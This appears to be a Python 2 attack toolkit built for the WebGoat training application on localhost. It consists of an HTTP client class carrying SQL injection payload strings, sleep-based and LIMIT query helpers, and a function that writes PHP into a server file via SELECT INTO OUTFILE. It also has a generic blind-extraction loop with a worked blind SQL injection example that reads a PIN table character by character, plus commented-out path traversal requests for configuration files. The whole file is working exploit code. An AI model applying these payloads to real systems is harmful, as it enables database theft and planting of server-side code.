
import urllib
import cookielib
import urllib2
from cookielib import Cookie, CookieJar 

class httpclient:
	def __init__(self):
		self.cookies = cookielib.LWPCookieJar()
		self.handlers = [
			urllib2.HTTPHandler(),
			urllib2.HTTPSHandler(),
			urllib2.HTTPCookieProcessor(self.cookies)
			]
		self.magic_inputs = ["'+'%'+'", "'", "' OR 1=1", "#" , "1' or '1' = '1'))/*", "1' or '1' = '1'))#"]
		


	def decorate(self, request):
		# do nothing
		return

	def make_opener(self, uri, agent='Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'):
		opener = urllib2.build_opener(*self.handlers)
		opener.addheaders = [('User-Agent', agent	)]
		opener.addheaders += [('Referer', uri)]
		return opener

	def fetch(self,uri, headers):
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print('<br><br>')
		
		return opener.open(req)

	def get(self,uri, data=dict(), headers=None):
		url_values = urllib.urlencode(data)
		uri = uri + '?' + url_values
		print(uri)
		print('<br><br>')
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	def post(self, uri, data = dict(), headers=None): # data - dict()
		data = urllib.urlencode(data)
		req = urllib2.Request(uri, data)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		print(uri)
		print('<br><br>')
		
		return opener.open(req)

	def patch_headers(self, opener,headers):
		if (headers is None):
			return
		for k,v in headers:
			opener.addheaders = [ (ok,ov) if k != ok else (k,v) for ok, ov in opener.addheaders]
		opener.addheaders += [ (k, v) for k, v in headers if k not in opener.addheaders]

	def dump(self):
			for cookie in self.cookies:
				 print(cookie.name, cookie.value)
				 
	def make_cookie(name, value,domain=None):
# Cookie(version, name, value, port, port_specified, domain,
# domain_specified, domain_initial_dot, path, path_specified,
# secure, expires, discard, comment, comment_url, rest, rfc2109=False)	
		return Cookie(None, name, value, None, False, domain, False, False, '/', True, False, '1370002304', False, 'TestCookie', None, None, False)
	
	def query_limit(offset, count):
		return " LIMIT "+str(offset) + "," + str(count)
	
	def sleep_query(seconds):
		return " and sleep("+str(seconds) + ")"

	# write some php into outfile
	def write_file(content, outfile):
		return 'SELECT \'' + content + '\' into outfile ' + outfile

	# data getter (x,y) <- x,y - injectable parameter, e.g. query
	# confirm(x) <- data pass
	# iterable1 <- e.g. character position
	# iterable2 <- e.g. allowed characters
	def blind_check(self,data_getter, confirm, iterable1, iterable2):
		result = list()
		for i1 in iterable1:
			confirmed = False
			for i2 in iterable2:
				if (confirm(data_getter(i1,i2))):
					result.append(i2)
					confirmed = True
					break
			if (confirmed == False):
				return result
		return result

cat = httpclient()
#cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
#t = '../'
#for x in range(0, 10):
	#t = t + '../'
	#data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File': t + 'WebGoat\\WEB-INF/spring-security.xml', 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
	#print(data.read())
	
#data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')})
#print(data.read())

def blind_example():
		def confirm(data):
			return 'Account number is valid' in data

		def data_getter(pos,letter):
				data =  cat.get('http://localhost:8080/WebGoat/attack', 
					{'Screen':1315528047,'menu' :1100, 'SUBMIT' : 'Go!',
						'account_number' : '102 and (1=(SELECT COUNT(*) from pins where substr(name,' + str(pos) + ',1)=\''+chr(letter)+'\' and cc_number=\'4321432143214321\' ))'}, 
					 {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')}).read()
				print(data)
				return data

		letters = range(65, 123)
		positions = range(0, 60)

		discovery = cat.blind_check(data_getter, confirm, positions, letters)
		print([ chr(x) for x in discovery])
